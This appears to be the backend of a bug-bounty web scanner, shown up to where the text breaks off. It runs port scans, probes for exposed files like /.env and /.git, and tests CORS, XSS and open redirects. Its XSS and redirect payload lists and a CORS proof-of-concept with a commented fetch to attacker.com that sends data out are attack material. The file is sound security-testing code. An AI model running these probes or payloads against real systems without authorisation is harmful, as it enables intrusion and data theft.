#!/usr/bin/env python3
"""
Bug Bounty Hunter Pro - Backend API
Real scanning engine with live results streaming
"""
from flask import Flask, request, jsonify, Response, stream_with_context
from flask_cors import CORS
import subprocess
import threading
import queue
import json
import os
import re
import socket
import ssl
import urllib.request
import urllib.error
import urllib.parse
import time
import hashlib
import random
import string
from datetime import datetime
import dns.resolver
import requests
import concurrent.futures

app = Flask(__name__)
CORS(app)

# ─── In-memory scan storage ────────────────────────────────────────────────────
active_scans = {}
scan_results = {}

# ─── Utility functions ─────────────────────────────────────────────────────────

def gen_scan_id():
    return hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:12]

def resolve_target(target):
    """Resolve domain to IPs"""
    results = []
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3
        resolver.lifetime = 5
        # A records
        try:
            answers = resolver.resolve(target, 'A')
            for r in answers:
                results.append({"type": "A", "value": str(r)})
        except: pass
        # AAAA records
        try:
            answers = resolver.resolve(target, 'AAAA')
            for r in answers:
                results.append({"type": "AAAA", "value": str(r)})
        except: pass
        # MX records
        try:
            answers = resolver.resolve(target, 'MX')
            for r in answers:
                results.append({"type": "MX", "value": str(r.exchange), "priority": r.preference})
        except: pass
        # NS records
        try:
            answers = resolver.resolve(target, 'NS')
            for r in answers:
                results.append({"type": "NS", "value": str(r)})
        except: pass
        # TXT records
        try:
            answers = resolver.resolve(target, 'TXT')
            for r in answers:
                results.append({"type": "TXT", "value": str(r)})
        except: pass
        # CNAME records
        try:
            answers = resolver.resolve(target, 'CNAME')
            for r in answers:
                results.append({"type": "CNAME", "value": str(r)})
        except: pass
    except Exception as e:
        results.append({"type": "ERROR", "value": str(e)})
    return results

def check_port(host, port, timeout=2):
    """Check if a port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def get_http_headers(url, timeout=5):
    """Fetch HTTP headers from URL"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        resp = requests.get(url, timeout=timeout, allow_redirects=True,
                          verify=False, headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) BugBountyHunter/1.0'})
        headers = dict(resp.headers)
        return {
            "status": resp.status_code,
            "url": resp.url,
            "headers": headers,
            "server": headers.get("Server", "Unknown"),
            "content_type": headers.get("Content-Type", ""),
            "x_powered_by": headers.get("X-Powered-By", ""),
            "response_time": resp.elapsed.total_seconds()
        }
    except requests.exceptions.SSLError:
        try:
            resp = requests.get(url, timeout=timeout, allow_redirects=True,
                              verify=False, headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/1.0'})
            return {
                "status": resp.status_code,
                "url": resp.url,
                "headers": dict(resp.headers),
                "server": resp.headers.get("Server", "Unknown"),
                "ssl_error": True
            }
        except: pass
    except Exception as e:
        return {"error": str(e)}

def scan_ports_fast(host, ports=None):
    """Fast port scanning using socket"""
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 5432, 6379, 8080, 8443, 8888, 27017]
    
    open_ports = []
    
    # First resolve host to IP
    try:
        ip = socket.gethostbyname(host)
    except:
        ip = host
    
    def check(port):
        if check_port(ip, port, timeout=1.5):
            service = get_service_name(port)
            banner = grab_banner(ip, port)
            return {
                "port": port,
                "state": "open",
                "service": service,
                "banner": banner
            }
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check, port): port for port in ports}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
    
    return sorted(open_ports, key=lambda x: x["port"])

def get_service_name(port):
    """Get common service name for port"""
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 465: "SMTPS", 587: "SMTP/TLS",
        993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 3306: "MySQL",
        3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "HTTP-Alt",
        9200: "Elasticsearch", 27017: "MongoDB", 5984: "CouchDB",
        2375: "Docker", 6443: "Kubernetes"
    }
    return services.get(port, "unknown")

def grab_banner(ip, port, timeout=2):
    """Try to grab service banner"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        if port in [80, 8080, 8888]:
            sock.send(b"HEAD / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
        elif port == 443:
            sock.close()
            return ""
        else:
            sock.send(b"\r\n")
        banner = sock.recv(256).decode('utf-8', errors='ignore').strip()
        sock.close()
        return banner[:100] if banner else ""
    except:
        return ""

def check_security_headers(url):
    """Check for missing security headers"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    findings = []
    critical_headers = {
        "Strict-Transport-Security": {"severity": "HIGH", "desc": "Missing HSTS - allows downgrade attacks"},
        "Content-Security-Policy": {"severity": "HIGH", "desc": "Missing CSP - allows XSS attacks"},
        "X-Frame-Options": {"severity": "MEDIUM", "desc": "Missing X-Frame-Options - allows clickjacking"},
        "X-Content-Type-Options": {"severity": "MEDIUM", "desc": "Missing X-Content-Type-Options - allows MIME sniffing"},
        "Referrer-Policy": {"severity": "LOW", "desc": "Missing Referrer-Policy - may leak sensitive URLs"},
        "Permissions-Policy": {"severity": "LOW", "desc": "Missing Permissions-Policy header"},
        "X-XSS-Protection": {"severity": "LOW", "desc": "Missing X-XSS-Protection header"},
        "Cache-Control": {"severity": "INFO", "desc": "Cache-Control not set"}
    }
    
    try:
        resp = requests.get(url, timeout=8, verify=False, 
                          headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/1.0'},
                          allow_redirects=True)
        headers = resp.headers
        
        for header, info in critical_headers.items():
            if header not in headers:
                findings.append({
                    "type": "Missing Security Header",
                    "header": header,
                    "severity": info["severity"],
                    "description": info["desc"],
                    "remediation": f"Add '{header}' response header with appropriate value"
                })
        
        # Check for information disclosure
        if "Server" in headers:
            server_val = headers["Server"]
            if any(v in server_val.lower() for v in ["apache/", "nginx/", "iis/", "openssl/"]):
                findings.append({
                    "type": "Information Disclosure",
                    "header": "Server",
                    "value": server_val,
                    "severity": "LOW",
                    "description": f"Server header reveals version: {server_val}",
                    "remediation": "Hide server version in production"
                })
        
        if "X-Powered-By" in headers:
            findings.append({
                "type": "Information Disclosure",
                "header": "X-Powered-By",
                "value": headers["X-Powered-By"],
                "severity": "LOW",
                "description": f"X-Powered-By reveals technology stack: {headers['X-Powered-By']}",
                "remediation": "Remove X-Powered-By header"
            })
        
        # Check cookie security
        set_cookie = headers.get("Set-Cookie", "")
        if set_cookie:
            if "httponly" not in set_cookie.lower():
                findings.append({
                    "type": "Cookie Security",
                    "severity": "MEDIUM",
                    "description": "Session cookie missing HttpOnly flag",
                    "remediation": "Add HttpOnly flag to all session cookies"
                })
            if "secure" not in set_cookie.lower():
                findings.append({
                    "type": "Cookie Security",
                    "severity": "MEDIUM",
                    "description": "Session cookie missing Secure flag",
                    "remediation": "Add Secure flag to all session cookies"
                })
            if "samesite" not in set_cookie.lower():
                findings.append({
                    "type": "Cookie Security",
                    "severity": "MEDIUM",
                    "description": "Session cookie missing SameSite attribute - CSRF risk",
                    "remediation": "Add SameSite=Strict or SameSite=Lax to cookies"
                })
        
        return {
            "url": url,
            "status": resp.status_code,
            "headers_checked": len(critical_headers),
            "findings": findings,
            "response_headers": dict(headers)
        }
    except Exception as e:
        return {"url": url, "error": str(e), "findings": []}

def check_ssl_tls(host):
    """Check SSL/TLS configuration"""
    results = {
        "host": host,
        "port": 443,
        "findings": [],
        "certificate": {}
    }
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=8) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                version = ssock.version()
                
                results["certificate"] = {
                    "subject": dict(x[0] for x in cert.get("subject", [])),
                    "issuer": dict(x[0] for x in cert.get("issuer", [])),
                    "version": cert.get("version"),
                    "not_before": cert.get("notBefore"),
                    "not_after": cert.get("notAfter"),
                    "san": cert.get("subjectAltName", []),
                    "serial": cert.get("serialNumber", "")
                }
                results["cipher"] = {
                    "name": cipher[0],
                    "version": cipher[1],
                    "bits": cipher[2]
                }
                results["tls_version"] = version
                
                # Check for weak ciphers
                if cipher[2] and cipher[2] < 128:
                    results["findings"].append({
                        "type": "Weak Cipher",
                        "severity": "HIGH",
                        "description": f"Weak cipher strength: {cipher[2]} bits ({cipher[0]})",
                        "remediation": "Configure server to use AES-256 or stronger ciphers"
                    })
                
                if version in ["TLSv1", "TLSv1.1", "SSLv2", "SSLv3"]:
                    results["findings"].append({
                        "type": "Outdated TLS",
                        "severity": "HIGH",
                        "description": f"Outdated TLS version in use: {version}",
                        "remediation": "Disable TLS 1.0 and 1.1, use TLS 1.2+ only"
                    })
                
    except ssl.SSLCertVerificationError as e:
        results["findings"].append({
            "type": "SSL Certificate Error",
            "severity": "HIGH",
            "description": f"SSL Certificate verification failed: {str(e)}",
            "remediation": "Install valid SSL certificate from trusted CA"
        })
    except Exception as e:
        results["error"] = str(e)
    
    return results

def check_common_paths(base_url):
    """Check for common exposed paths and admin panels"""
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'https://' + base_url
    
    paths_to_check = [
        # Admin panels
        "/admin", "/admin/login", "/administrator", "/wp-admin",
        "/panel", "/dashboard", "/_admin", "/manage",
        # Config files
        "/.env", "/.git/config", "/.git/HEAD", "/config.php",
        "/config.yml", "/config.yaml", "/settings.php",
        "/.htaccess", "/web.config", "/robots.txt", "/sitemap.xml",
        # API endpoints
        "/api", "/api/v1", "/api/v2", "/api/docs", "/swagger.json",
        "/swagger/v1/swagger.json", "/openapi.json", "/.well-known/security.txt",
        # Backup files
        "/backup", "/backup.zip", "/backup.tar.gz", "/db.sql",
        "/dump.sql", "/database.sql",
        # Common frameworks
        "/phpinfo.php", "/info.php", "/test.php", "/debug",
        "/actuator", "/actuator/health", "/actuator/env", "/actuator/info",
        "/health", "/status", "/metrics",
        # Login pages
        "/login", "/signin", "/auth/login", "/user/login",
        # Source code
        "/.DS_Store", "/package.json", "/composer.json",
    ]
    
    results = []
    
    def check_path(path):
        try:
            url = base_url.rstrip('/') + path
            resp = requests.get(url, timeout=4, verify=False, allow_redirects=False,
                              headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/1.0'})
            
            if resp.status_code in [200, 301, 302, 403]:
                severity = "INFO"
                vuln_type = "Endpoint Discovered"
                
                if resp.status_code == 200:
                    if any(x in path for x in ['.env', '.git', 'config', 'backup', 'dump', 'sql']):
                        severity = "CRITICAL"
                        vuln_type = "Sensitive File Exposed"
                    elif any(x in path for x in ['/admin', '/administrator', '/wp-admin', '/panel']):
                        severity = "HIGH"
                        vuln_type = "Admin Panel Found"
                    elif any(x in path for x in ['phpinfo', 'actuator', '/debug']):
                        severity = "HIGH"
                        vuln_type = "Debug/Info Endpoint"
                    elif 'api' in path or 'swagger' in path or 'openapi' in path:
                        severity = "MEDIUM"
                        vuln_type = "API Endpoint Found"
                    else:
                        severity = "LOW"
                
                elif resp.status_code == 403:
                    severity = "LOW"
                    vuln_type = "Forbidden (Exists but Restricted)"
                
                return {
                    "path": path,
                    "url": url,
                    "status": resp.status_code,
                    "type": vuln_type,
                    "severity": severity,
                    "content_length": len(resp.content),
                    "server": resp.headers.get("Server", "")
                }
        except: pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_path, path): path for path in paths_to_check}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
    
    return sorted(results, key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}.get(x["severity"], 5))

def check_cors_misconfiguration(url):
    """Check for CORS misconfigurations"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    findings = []
    test_origins = [
        "https://evil.com",
        "https://attacker.com", 
        f"null",
        "https://evil." + urllib.parse.urlparse(url).netloc.split(".")[-2] + "." + urllib.parse.urlparse(url).netloc.split(".")[-1] if "." in urllib.parse.urlparse(url).netloc else "https://evil.com"
    ]
    
    for origin in test_origins:
        try:
            resp = requests.get(url, timeout=5, verify=False,
                              headers={
                                  'User-Agent': 'Mozilla/5.0',
                                  'Origin': origin
                              })
            
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == origin or acao == '*':
                severity = "CRITICAL" if acac.lower() == 'true' else "HIGH"
                findings.append({
                    "type": "CORS Misconfiguration",
                    "severity": severity,
                    "origin_tested": origin,
                    "acao_header": acao,
                    "acac_header": acac,
                    "description": f"CORS allows origin '{origin}'" + (" with credentials!" if acac.lower() == 'true' else ""),
                    "poc": generate_cors_poc(url, origin),
                    "remediation": "Validate Origin header against whitelist. Never use wildcard with credentials."
                })
        except: pass
    
    return findings

def generate_cors_poc(url, origin):
    """Generate CORS PoC HTML"""
    return f"""<!-- CORS PoC - Test in browser console -->
<script>
fetch('{url}', {{
  method: 'GET',
  credentials: 'include',
  headers: {{ 'Origin': '{origin}' }}
}})
.then(r => r.text())
.then(data => {{
  // Data extracted from target site!
  document.body.innerHTML = '<pre>' + data.substring(0, 500) + '</pre>';
  // Attacker can now exfiltrate: fetch('https://attacker.com/?data=' + btoa(data))
}});
</script>"""

def check_xss_basic(url):
    """Basic XSS detection"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    findings = []
    xss_payloads = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '"><svg/onload=alert(1)>',
        '<img src=x onerror="alert(document.cookie)">',
        '{{7*7}}'  # Template injection check
    ]
    
    # Parse URL and check parameters
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        # Try some common parameter names
        test_urls = [
            url + "?q=XSSTEST",
            url + "?search=XSSTEST",
            url + "?id=XSSTEST",
            url + "?name=XSSTEST"
        ]
    else:
        test_urls = [url]
    
    for test_url in test_urls[:2]:
        for payload in xss_payloads[:3]:
            try:
                test = test_url.replace("XSSTEST", urllib.parse.quote(payload))
                resp = requests.get(test, timeout=4, verify=False,
                                  headers={'User-Agent': 'Mozilla/5.0'})
                
                # Check if payload is reflected unencoded
                if payload in resp.text and payload not in ['{{7*7}}']:
                    findings.append({
                        "type": "Reflected XSS",
                        "severity": "HIGH",
                        "url": test,
                        "payload": payload,
                        "description": f"XSS payload reflected in response: {payload}",
                        "poc": f"Open URL: {test}",
                        "remediation": "Encode user input before reflecting in HTML response"
                    })
                    break
                elif "{{7*7}}" == payload and "49" in resp.text:
                    findings.append({
                        "type": "Server-Side Template Injection (SSTI)",
                        "severity": "CRITICAL",
                        "url": test,
                        "payload": payload,
                        "description": "Template injection detected - math expression evaluated",
                        "poc": f"Open URL: {test}",
                        "remediation": "Never pass user input to template engine directly"
                    })
            except: pass
    
    return findings

def check_open_redirect(url):
    """Check for open redirect vulnerabilities"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    findings = []
    redirect_payloads = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https:evil.com",
        "/%2F/evil.com"
    ]
    
    redirect_params = ['redirect', 'url', 'next', 'return', 'returnUrl', 'redirect_uri',
                       'return_url', 'goto', 'redir', 'destination', 'target', 'link']
    
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    for param in redirect_params[:5]:
        for payload in redirect_payloads[:3]:
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(test_url, timeout=4, verify=False, allow_redirects=False,
                                   headers={'User-Agent': 'Mozilla/5.0'})
                
                location = resp.headers.get('Location', '')
                if location and ('evil.com' in location or payload in location):
                    findings.append({
                        "type": "Open Redirect",
                        "severity": "MEDIUM",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "redirect_to": location,
                        "description": f"Open redirect via '{param}' parameter",
                        "poc": f"Visit: {test_url}",
                        "remediation": "Validate redirect URLs against whitelist of allowed domains"
                    })
                    break
            except: pass
    
    return findings

def fingerprint_tech(url):
    """Fingerprint technologies used"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    techs = []
    
    try:
        resp = requests.get(url, timeout=8, verify=False, 
                          headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/1.0'},
                          allow_redirects=True)
        
        content = resp.text.lower()
        headers = resp.headers
        
        # Server fingerprinting
        server = headers.get("Server", "")
        if server:
            techs.append({"name": "Server", "value": server, "category": "web-server"})
        
        # Framework detection from headers/content
        tech_signatures = [
            # Web Servers
            ("nginx", "Nginx", "web-server"),
            ("apache", "Apache", "web-server"),
            ("iis", "Microsoft IIS", "web-server"),
            ("cloudflare", "Cloudflare", "cdn"),
            # Backend
            ("x-powered-by", headers.get("X-Powered-By", ""), "backend"),
            # CMS
            ("wp-content", "WordPress", "cms"),
            ("wp-includes", "WordPress", "cms"),
            ("joomla", "Joomla", "cms"),
            ("drupal", "Drupal", "cms"),
            ("bitrix", "Bitrix", "cms"),
            ("magento", "Magento", "cms"),
            ("shopify", "Shopify", "e-commerce"),
            # JS Frameworks
            ("react", "React", "frontend"),
            ("angular", "Angular", "frontend"),
            ("vue.js", "Vue.js", "frontend"),
            ("next.js", "Next.js", "frontend"),
            ("jquery", "jQuery", "frontend"),
            # Backend Frameworks
            ("laravel", "Laravel", "framework"),
            ("django", "Django", "framework"),
            ("rails", "Ruby on Rails", "framework"),
            ("express", "Express.js", "framework"),
            # Cloud/CDN
            ("amazonaws", "AWS", "cloud"),
            ("cloudfront", "AWS CloudFront", "cdn"),
            ("fastly", "Fastly", "cdn"),
            # Analytics
            ("google-analytics", "Google Analytics", "analytics"),
            ("gtag", "Google Tag Manager", "analytics"),
        ]
        
        found_techs = set()
        for sig, name, category in tech_signatures:
            if sig in content or sig in server.lower() or sig in headers.get("X-Powered-By", "").lower():
                if name not in found_techs:
                    found_techs.add(name)
                    if category != "backend" or sig != "x-powered-by":
                        techs.append({"name": name, "category": category, 
                                     "source": "header" if sig in server.lower() + headers.get("X-Powered-By","").lower() else "content"})
        
        # X-Powered-By
        xpb = headers.get("X-Powered-By", "")
        if xpb:
            techs.append({"name": xpb, "category": "backend", "source": "X-Powered-By header"})
        
        # Check for common CVE-prone versions
        version_patterns = [
            (r"wordpress[/ ]([0-9.]+)", "WordPress"),
            (r"apache[/ ]([0-9.]+)", "Apache"),
            (r"nginx[/ ]([0-9.]+)", "Nginx"),
            (r"php[/ ]([0-9.]+)", "PHP"),
            (r"jquery[/ ]([0-9.]+)", "jQuery"),
            (r"bootstrap[/ ]([0-9.]+)", "Bootstrap"),
        ]
        
        for pattern, tech_name in version_patterns:
            match = re.search(pattern, content + " " + server.lower() + " " + headers.get("X-Powered-By","").lower(), re.IGNORECASE)
            if match:
                version = match.group(1)
                for t in techs:
                    if t.get("name", "").startswith(tech_name):
                        t["version"] = version
                        break
                else:
                    techs.append({"name": tech_name, "version": version, "category": "detected"})
        
    except Exception as e:
        techs.append({"name": "Error", "value": str(e), "category": "error"})
    
    return techs

def generate_poc_report(scan_data):
    """Generate a PoC report from scan findings"""
    target = scan_data.get("target", "")
    findings = scan_data.get("all_findings", [])
    
    report = {
        "title": f"Bug Bounty Report - {target}",
        "target": target,
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "severity_counts": {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0},
        "findings": [],
        "executive_summary": "",
        "recommendations": []
    }
    
    for finding in findings:
        sev = finding.get("severity", "INFO")
        report["severity_counts"][sev] = report["severity_counts"].get(sev, 0) + 1
        
        poc_entry = {
            "id": f"FINDING-{len(report['findings'])+1:03d}",
            "type": finding.get("type", "Unknown"),
            "severity": sev,
            "description": finding.get("description", ""),
            "affected": finding.get("url", finding.get("path", target)),
            "poc": finding.get("poc", ""),
            "remediation": finding.get("remediation", ""),
            "cvss": calculate_quick_cvss(finding)
        }
        report["findings"].append(poc_entry)
    
    # Sort by severity
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    report["findings"].sort(key=lambda x: sev_order.get(x["severity"], 5))
    
    # Executive summary
    c = report["severity_counts"]
    report["executive_summary"] = (
        f"Security assessment of {target} identified {len(findings)} potential findings: "
        f"{c.get('CRITICAL',0)} Critical, {c.get('HIGH',0)} High, {c.get('MEDIUM',0)} Medium, "
        f"{c.get('LOW',0)} Low severity issues."
    )
    
    return report

def calculate_quick_cvss(finding):
    """Quick CVSS estimate based on finding type"""
    base_scores = {
        "CRITICAL": (9.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"),
        "HIGH": (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
        "MEDIUM": (5.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
        "LOW": (3.1, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"),
        "INFO": (0.0, "N/A")
    }
    sev = finding.get("severity", "INFO")
    score, vector = base_scores.get(sev, (0.0, "N/A"))
    return {"score": score, "vector": vector, "severity": sev}

# ─── API Routes ────────────────────────────────────────────────────────────────

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({"status": "ok", "version": "1.0.0", "tools": check_available_tools()})

def check_available_tools():
    tools = {}
    for tool in ['nmap', 'subfinder', 'nuclei', 'ffuf', 'curl', 'dig', 'whois']:
        result = subprocess.run(['which', tool], capture_output=True, text=True)
        tools[tool] = result.returncode == 0
    return tools

@app.route('/api/scan/start', methods=['POST'])
def start_scan():
    data = request.json or {}
    target = data.get('target', '').strip()
    scan_type = data.get('scan_type', 'full')
    
    if not target:
        return jsonify({"error": "Target is required"}), 400
    
    # Basic validation
    target = re.sub(r'^https?://', '', target).rstrip('/')
    
    scan_id = gen_scan_id()
    active_scans[scan_id] = {
        "id": scan_id,
        "target": target,
        "scan_type": scan_type,
        "status": "running",
        "started": datetime.now().isoformat(),
        "progress": 0,
        "logs": [],
        "findings": [],
        "completed": False
    }
    
    # Start scan in background thread
    thread = threading.Thread(target=run_full_scan, args=(scan_id, target, scan_type))
    thread.daemon = True
    thread.start()
    
    return jsonify({"scan_id": scan_id, "status": "started", "target": target})

def add_log(scan_id, message, level="info"):
    """Add log message to scan"""
    if scan_id in active_scans:
        active_scans[scan_id]["logs"].append({
            "time": datetime.now().strftime("%H:%M:%S"),
            "level": level,
            "message": message
        })

def add_finding(scan_id, finding):
    """Add finding to scan"""
    if scan_id in active_scans:
        active_scans[scan_id]["findings"].append(finding)

def run_full_scan(scan_id, target, scan_type):
    """Main scanning function running in background"""
    try:
        add_log(scan_id, f"🎯 Starting scan of: {target}", "info")
        active_scans[scan_id]["progress"] = 5
        
        # Phase 1: DNS Reconnaissance
        add_log(scan_id, "📡 Phase 1: DNS Reconnaissance", "info")
        active_scans[scan_id]["phase"] = "DNS Recon"
        
        dns_results = resolve_target(target)
        active_scans[scan_id]["dns"] = dns_results
        add_log(scan_id, f"✅ DNS: Found {len(dns_results)} records", "success")
        active_scans[scan_id]["progress"] = 15
        
        for record in dns_results:
            add_log(scan_id, f"   → {record['type']}: {record['value']}", "info")
        
        # Phase 2: HTTP Probe
        add_log(scan_id, "🌐 Phase 2: HTTP/HTTPS Probe", "info")
        active_scans[scan_id]["phase"] = "HTTP Probe"
        
        http_info = get_http_headers(target)
        active_scans[scan_id]["http_info"] = http_info
        if http_info and "status" in http_info:
            add_log(scan_id, f"✅ HTTP {http_info['status']} - Server: {http_info.get('server', 'Unknown')}", "success")
            if http_info.get("x_powered_by"):
                add_log(scan_id, f"   → X-Powered-By: {http_info['x_powered_by']}", "warning")
        active_scans[scan_id]["progress"] = 25
        
        # Phase 3: Technology Fingerprinting
        add_log(scan_id, "🔍 Phase 3: Technology Fingerprinting", "info")
        active_scans[scan_id]["phase"] = "Fingerprinting"
        
        techs = fingerprint_tech(target)
        active_scans[scan_id]["technologies"] = techs
        if techs:
            add_log(scan_id, f"✅ Identified {len(techs)} technologies:", "success")
            for tech in techs:
                ver = f" v{tech.get('version','')}" if tech.get('version') else ""
                add_log(scan_id, f"   → {tech.get('name','')}{ver} [{tech.get('category','')}]", "info")
        active_scans[scan_id]["progress"] = 35
        
        # Phase 4: Port Scanning
        add_log(scan_id, "🔌 Phase 4: Port Scanning", "info")
        active_scans[scan_id]["phase"] = "Port Scan"
        
        try:
            ip = socket.gethostbyname(target)
            add_log(scan_id, f"   → Resolved to: {ip}", "info")
        except:
            ip = target
        
        ports = scan_ports_fast(target)
        active_scans[scan_id]["ports"] = ports
        if ports:
            add_log(scan_id, f"✅ Found {len(ports)} open ports:", "success")
            for p in ports:
                banner = f" - {p['banner'][:50]}" if p.get('banner') else ""
                add_log(scan_id, f"   → {p['port']}/tcp OPEN ({p['service']}){banner}", "info")
                
                # Flag potentially dangerous services
                if p['port'] in [21, 23, 3306, 5432, 6379, 27017, 2375]:
                    add_finding(scan_id, {
                        "type": "Exposed Service",
                        "severity": "HIGH",
                        "description": f"Port {p['port']} ({p['service']}) exposed to internet",
                        "port": p['port'],
                        "service": p['service'],
                        "remediation": f"Restrict access to {p['service']} service using firewall rules"
                    })
        else:
            add_log(scan_id, "   → Common ports appear filtered", "info")
        active_scans[scan_id]["progress"] = 45
        
        # Phase 5: SSL/TLS Check
        add_log(scan_id, "🔒 Phase 5: SSL/TLS Analysis", "info")
        active_scans[scan_id]["phase"] = "SSL/TLS"
        
        ssl_results = check_ssl_tls(target)
        active_scans[scan_id]["ssl"] = ssl_results
        
        if ssl_results.get("certificate"):
            cert = ssl_results["certificate"]
            add_log(scan_id, f"✅ SSL Certificate valid", "success")
            add_log(scan_id, f"   → Issued to: {cert.get('subject', {}).get('commonName', 'N/A')}", "info")
            add_log(scan_id, f"   → Issuer: {cert.get('issuer', {}).get('organizationName', 'N/A')}", "info")
            add_log(scan_id, f"   → Expires: {cert.get('not_after', 'N/A')}", "info")
            if ssl_results.get("tls_version"):
                add_log(scan_id, f"   → TLS Version: {ssl_results['tls_version']}", "info")
        elif ssl_results.get("error"):
            add_log(scan_id, f"⚠️  SSL Error: {ssl_results['error']}", "warning")
        
        for finding in ssl_results.get("findings", []):
            add_finding(scan_id, finding)
            add_log(scan_id, f"⚠️  {finding['severity']}: {finding['description']}", "warning")
        
        active_scans[scan_id]["progress"] = 55
        
        # Phase 6: Security Headers
        add_log(scan_id, "🛡️  Phase 6: Security Headers Analysis", "info")
        active_scans[scan_id]["phase"] = "Security Headers"
        
        headers_result = check_security_headers(target)
        active_scans[scan_id]["security_headers"] = headers_result
        
        sec_findings = headers_result.get("findings", [])
        add_log(scan_id, f"✅ Checked {headers_result.get('headers_checked', 0)} security headers", "success")
        
        for finding in sec_findings:
            add_finding(scan_id, finding)
            level = "warning" if finding["severity"] in ["HIGH", "CRITICAL"] else "info"
            add_log(scan_id, f"   → {finding['severity']}: {finding['description']}", level)
        
        active_scans[scan_id]["progress"] = 65
        
        # Phase 7: CORS Check
        add_log(scan_id, "🌍 Phase 7: CORS Misconfiguration Check", "info")
        active_scans[scan_id]["phase"] = "CORS"
        
        cors_findings = check_cors_misconfiguration(target)
        for finding in cors_findings:
            add_finding(scan_id, finding)
            add_log(scan_id, f"⚠️  {finding['severity']}: {finding['description']}", "warning")
        
        if not cors_findings:
            add_log(scan_id, "   → No CORS misconfigurations detected", "success")
        
        active_scans[scan_id]["progress"] = 75
        
        # Phase 8: Path Discovery
        add_log(scan_id, "📂 Phase 8: Path & Endpoint Discovery", "info")
        active_scans[scan_id]["phase"] = "Path Discovery"
        
        paths = check_common_paths(target)
        active_scans[scan_id]["paths"] = paths
        
        interesting = [p for p in paths if p["severity"] in ["CRITICAL", "HIGH", "MEDIUM"]]
        if interesting:
            add_log(scan_id, f"⚠️  Found {len(interesting)} interesting paths:", "warning")
            for path in interesting:
                add_finding(scan_id, path)
                add_log(scan_id, f"   → [{path['severity']}] {path['url']} ({path['status']}) - {path['type']}", "warning")
        else:
            add_log(scan_id, f"   → Checked {len(paths)} paths, {len(paths)} low-risk results", "success")
        
        active_scans[scan_id]["progress"] = 85
        
        # Phase 9: XSS & Redirect Checks
        if scan_type != 'quick':
            add_log(scan_id, "💉 Phase 9: Injection & Redirect Tests", "info")
            active_scans[scan_id]["phase"] = "Injection Tests"
            
            # XSS
            xss_findings = check_xss_basic(target)
            for finding in xss_findings:
                add_finding(scan_id, finding)
                add_log(scan_id, f"🚨 {finding['severity']}: {finding['description']}", "error")
            
            # Open Redirect
            redirect_findings = check_open_redirect(target)
            for finding in redirect_findings:
                add_finding(scan_id, finding)
                add_log(scan_id, f"⚠️  {finding['severity']}: {finding['description']}", "warning")
            
            if not xss_findings and not redirect_findings:
                add_log(scan_id, "   → No basic injection/redirect issues found", "success")
        
        active_scans[scan_id]["progress"] = 95
        
        # Phase 10: Generate Report
        add_log(scan_id, "📊 Generating PoC Report...", "info")
        
        all_findings = active_scans[scan_id]["findings"]
        scan_data = {
            "target": target,
            "all_findings": all_findings
        }
        poc_report = generate_poc_report(scan_data)
        active_scans[scan_id]["poc_report"] = poc_report
        
        # Summary
        counts = poc_report["severity_counts"]
